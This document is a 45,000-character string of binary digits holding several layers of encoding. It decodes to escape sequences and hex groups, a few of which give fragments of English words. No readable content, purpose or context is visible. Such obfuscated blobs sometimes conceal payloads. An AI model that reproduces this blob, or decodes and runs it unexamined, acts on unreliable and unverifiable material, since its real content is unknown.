010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110110001100100011000000110111001101000011011000111000001101100011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100110011001000110000001101110011010000110110011001100011011001100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110001100110010001101110011001000110111001100100011011100110010011000100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110111001100100011011100110010001101110011010100110111001101100110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001010011001000110111001101110011010000110010001100000011011001100100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011000100110110001101000011011000110101001100100011000000110111001110010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100110001101110011010100110010001100000011011100110100001101100011100001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011001000110000001101100011001100110110011001100011011000110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110111001100100011001000110000001101010110010100110101011001100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010101100101001100100011000000110010001100010011001000110001001100100011000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001101110011001000110111001100100011011100110010001100110011010100110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110111001100110011011100110000001101100011010100110110001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110100001100100011000000110100001100110011011001100110001101100011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011011100110010001101110110000100110010001100000011010101100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101010110011000110101011001010011001000110000001100100011000000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011000000110010001100000011001000110111001100100011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001101110011001000110111001100100011011100110010001100110011010000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110111001101000011011000110001001101100110001000110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101100110010100110110011001100011001000110000001101110011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011011100110011001101110011000000110110011001100011011001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001100110110001110010011011000110010001101100011100100110110011000110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000111001001101110011010000110110001110010011011000110101001101110011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011011000110110001101100110011000110111001100100011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010000110110001110000011011000110101001100100011000000110010001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110111001100100011011100110010001101110011001000110000001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001101110011001000110111001100100011011100110010001100000011011100110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001100110110001101010011001000110000001101100110011000110110001101100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101110011010000110110001110000011011000111001001101110011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011011100110000001101110011001000110110011001100011011000110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001000110110001100010011011001100100001100100011000000110010001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011000000110010001101110011001000110111001100100011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011000100011010000110111001100100110001000110010001101110011001000110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011011100110010001100000011001000110000001100100011000000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011000000110010001100000011001001100010001100110110010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011000100011000001100001001100100011000000110010001100000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110110001100110010011001010011001001100101001100100110010100110010011001010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100101001100100011011100110010001101110011001000110111001100100110001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110100011001100011001001100010001100100011011100110010001101110011001000110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010001100000011010001100100001101000110011000110100001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101000011001000110101001110010011001000110000001101000011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110100001100010011010001100101001101000011011100110010001100000011010000110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101000110000100110100011001100011010001100101001100100011000000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100010001100100011011100110010001101110011001000110111001100100110010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111011000110011000001100001001100100011000000110010001100000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100110001000110010011001000011001001100100001100100110010000110010011001000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100100001100100110010000110010011000100011000001100001001100100011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001101110011001000110111001100100110001000110101001101110011000001100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011000000110111001100100011011000111001001101100110010100110111001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001100100011001000110100011001010011011001100110001101110011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011001101100001001100100011000000110010011001000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101010011010000110110001110000011011000111001001101110011001100110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110100001101100110011000110110011001100011011001100011001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101100011011000110001001101100011001100110110001101010011011000110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110110011001100011011001100010001100100011000000110110001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110011001101100011001100110110011001100011011100110101001101100110010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011001000110000001101100011010100110111001101100011011000110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110010100110010001100000011011000111001001101100011011000110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100111001001101100110011000110111001101010011001000110000001101100011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011001100101001100100011011100110111001101000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010000110110001110000011011000110101001100100011000000110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100100001101100011000100110110001110010011011001100011001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011000110110001100100011000000110111001110010011011001100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010100110111001100100011001000110000001101110011011000110110001110010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110011001101110011010000110110001110010011011001100100001100100011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110000011000010011011100110000001101110011001000110110001110010011011001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010000110010001100000011001000110010001100100011001100110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010000111000001101100011100100110111001101000011001000110000001101000011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110101001101000011010100110010001101000110001100110010011000100011010000110011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110111001101000011011001100110001100100011000000110111001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110101001101100011100100110111001101000011001000110000001101110011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001110000011011000110101001100100011000000110111001100000011011100110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011001000110000011000010011011100110000001101110011001000110110001110010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100101001101110011010000110010001100000011001000110010001100100011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011010100110101001101110011001100110110001101010011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011011100110111001101110011011100110111001100100110010100110110001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110010001101100011000100110111001100000011011000111000001100100110010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011001100110001101100110001000110010011001010011011000110011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110110011001000011001000110000001101100011011000110110011001100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110010001100100011000000110110011001000011011001100110001101110011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011001000110000001101100011100100110110011001010011011000110110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110111001100110011001000110000001101100011000100110110001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100110001101110011010100110111001101000011001000110000001101110011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011100110101001101110011001000110010001100000011011100110110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011100100110110001100110011011100110100001101100011100100110110011001000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101010110010100110101011001100011010101100101001100100011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110000011000010011000001100001001101110011010000110111001100100011011100111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100110110000100110000011000010011001000110000001101000011010000110101001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001101100100001101100110011000110111001100000011011000110101001101100110010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001110000011001000110111001100100110011000110111001100110011011100110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110011000110111001100100011011000110001001101100011011100110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100110001101110011001100110110001101000011011000110011001101100011000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100100011011000110100001100110011000100110010011001100011001001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011011000110110001100100011001001100101001101100011010000110110001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110100001100100011011100110010001110010011001001100101001101110011001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011011000110001001101100011010000110110011000110011011000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110010100110110001101010011011100110011001100100011100000110010001110010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011000001100001001100100011000000110110001101010011011001100100001101100011000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001110010011011001100011001100100011000000110011011001000011011001100100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110001100110011011001000011010000110100001101010011010000110101011000100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001100110000001101010110010000110010011001010011011100110010001101100011010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100000011011001100011001101100011000100110110001100110011011000110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011100000110010001101110011010101100011001101100110010100110010001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100011001100100011011100110010001101110011001000111001001100000110000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011011100110000001101100011000100110111001100110011011100110011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011011100110110011001100011011100110010001101100011010000110110011000110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000111001001101110011001100110111001101000011001000110000001100110110010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100000011011100110111001100110110010000110100001101000011010100110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101010110001000110011001100010011010101100100001100100110010100110111001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110101001101110011000000110110011000110011011000110001001101100011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011001000111000001100100011011100110101011000110011011001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011011100110010011000110011001000110111001100100011011100110010001110010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011000001100001001100100011000000110111001100010011001100110010001100110110010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110100001101000011010100110100001101010110001000110011001100100011010101100100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100110010100110111001100100011011000110101001101110011000000110110011000110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110001001101100011001100110110001101010011001000111000001100100011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110101011000110011011001100101001100100011011100110010011000110011001000110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011011100110010001110010011000001100001001101100011010100110111001110000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110011001101100011010100110111001100000011011100110100001100110110000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011000110011001101100100001101110011001100110111001101000011011100110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011100000110111001100100011011000110001001101110011011100110101011001100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000111001001101100110010100110111001100000011011100110101001101110011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001110000011001000110010001100100011001100110010001100000011010001100100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011000100110111001100110011011100110101001101100110001000110110011000100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110001001101100110010100110010001100000011010000111001001101000011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011011001100010001101100110011000110111001100100011011000110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011000100110110011001010011010101100011001101100110010100110110001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100110001101100110010100110111001101000011011001100110001101100011100001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110011011000010011001000110000001100110011000100110011001100000011001100110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100110011000000110011001100000011001100110110001100110011010100110011001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001100110001001100110011001000110011001100110011001100110100001100110011010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110011001101100011001100110111001101010110001100110110011001010011010000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101000011010000110010001100000011001101100100001100100011000000110010001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000111001001100100011100100110000011000010011001000110000001101110011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100010011011100110011001101110011001100110111001101110011011001100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001000110110001101000011011001100011001101100011100100110111001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110100001100100011000000110011011001000011011100110000001101110011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110011011001000011001000110000001101110011001100110111001101000011011100110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011100000110010001100100011010001100100001101100011000100110111001100110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110101001101100110001000110110011000100011011000110001001101100110010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011011000110110001101100011100100110110011000110011011000110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110111001110010011011000110111001100100011000000110110001100100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110101001101110011001000110110001110010011011100110011001101100011100101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101110011011001100110001101110011001000110110001101000011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110001100110110001110010011011100110011001101110011010000110101011000110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100101001101100011001100110110011001100011011001100101001101110011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011000111000001100110110000100110010011001100011011100110011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010000110110001100110011011000110001001101110011001000110110001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100110001101110011000000110110001100010011011100110011001101110011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101110011011001100110001101110011001000110110001101000011001001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010000110111001110000011011100110100001101010110001100110110011001010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010100110000001101000011000100110101001100110011010100110011001101010011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110100011001100011010100110010001101000011010000110010001100000011001101100100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110010001100100011001000111001001100100011100100110000011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101110011000100110011001100100011001101100100001100110011000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011001000110011001101110011001000110110001100010011011100110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101010110011000110110001110010011011001100101001101110011000000110111001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110100001100100011100000110010001101110011011001100100001101110011010101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011000110011011000110001001101100011100100110010001100000011011100110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001000110110001101000011001000110000001101100110010100110110011001100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101100011001000110111001100100011011100110000001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011001100100001100100110001100110010011000110011001101100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100110110011000110010001100000011001000110111001100100011100100110000011000010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110000001101110011010000110111001100100011011100111001001100110110000101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011001100011011100110000001101100011010100110110011001010011001000111000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011011100110010011001100011011100110011001101110011010000110110011001100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110010001101100011000100110110001101110011011000110101001100100110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100110011011000110100001101100011001100110110001100010011011100110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010000110011001100010011001001100110001100100110010100110110001101100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110010001100100110010100110110001101000011011000110001001101110011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001101110011001001100011001100100011011100110111001101110011001000110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011100100110010011001010011011100110111001101110011001000110110001110010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110100001101100011010100110010001110000011011001100100001101100110001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011000100011001000110111001101010110001100110110011001010011001000110111011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100110001000110111001100000011011100110111001100100110001000110010001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010101100011001101100110010100110010001101110011001001100010001101110011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001101000011011100110010001100100011100000110111001100010011001100110010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011100100110010001110010011000001100001001100100011000000110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100111000001101100011001100110110001101010011011100110000001101110011010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110011011000010011011100110000001101110011001000110110001110010011011001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010000110010001100000011001000111000001100100011011100110111001101000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000111001001101100011010000110110001100010011011001100010001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100100011011000111001001101110011001100110110001100010011001000110000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110010000110110001101010011011001100101001101110011100100110110001110010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100100001101110011000000110110001100010011011001100101001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101000011011000110001001101110011010000110110001100010011001001100011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110111001100000011011000110101001101100110010100110111001110010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110101001101110011001000110110001100010011011001100101001101100011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100010011011001100101001100100011000000110110001100010011011001100010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011000100110110011001010011001000110000001101110011001100110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100011001101100011000100110110011000110011011100110101001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101000011011000111001001101100110010000110111001101010011011001100011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011000100110110001110010011001000110000001101100011010000110110001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011100110010001101100011100100110010001100000011011000110001001101110011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001100010011011001100011001100100011011100110010001110010011000001100001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011010000110010001100000011010001100110001100100110001000110010001101110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010101100110001101010110011000110101011001100011010101100110001101010110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001101010011011000110101001101100110010000110110001100010011011000111001011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100110001100110101011001100011010101100110001101010110011000110101011001100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010101100110001100110110010000110010001101110011001001100010001101100110010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110011000110011001001100010001100100011011100110101011000110011011001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011011100110010011000100011001000110111001101010110011000110101011001100111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010101100110001101010110011000110111001100000011011000110001001101110011001101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110111001100110011011100110111001101100110011000110111001100100011011000110100011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101010110011000110101011001100011010101100110001101010110011000110011011001000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001000110111001100100110001000110111001100000011011100110111001100100110001001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110101001101110011000001100001001100000110000100110111001101010011011100110011011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101100011010100110111001100100011011000110001001101100011011100110110001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011001100101001101110011010000110111001100110011001000110000001100110110010001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001100000011010101100010001100100011100000110010001101110011010100110101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110011001100110110001101010011011100110010001100100110010000110110001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000110111001101100011010100110110011001010011011100110100001100100011011101110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011000110011001000110000001100100011011100110100011001000011011001100110011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001101110110000100110110001110010011011001100011001101100110001100110110001100010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011001001100110001100110011010100110010011001010011001100110000001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010001110000011010100111000001100110011000100110011001100010011001101100010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110101001101010011001101100010001100100011000000110100011000110111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011011000111001001101100110010100110111001101010011011100111000001100100011000001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110110001110010011001100110110001100110011100000110011001101100011001101100010011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100100011000000110110001101010011011001100101001100100110010000110101001101010111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010100110011001100110110001000110010001100000011011100110010001101110011011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110011011000010011001100110001001100100110010100110011001110010011001001100101011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100110011000000110010011001010011001100110001001100100011100100110010001100000111010001011100011011100101110001111000001100000011000001011100011110000011000000110000010111000111100000110000001100000011010000110111001101100011010100110110001100110011011001100010001101100110011001110100010111000110111001011100011110000011000000110000010111000111100000110000001100000101110001111000001100000011000000110010011001100011001100110010001100110011000000110011001100000011001100111000011101000101110001101110010111000111100000110000001100000101110001111000001100000011000001011100011110000011000000110000001100110011000000110011001101110011001100110001001100110011011000110011001100010111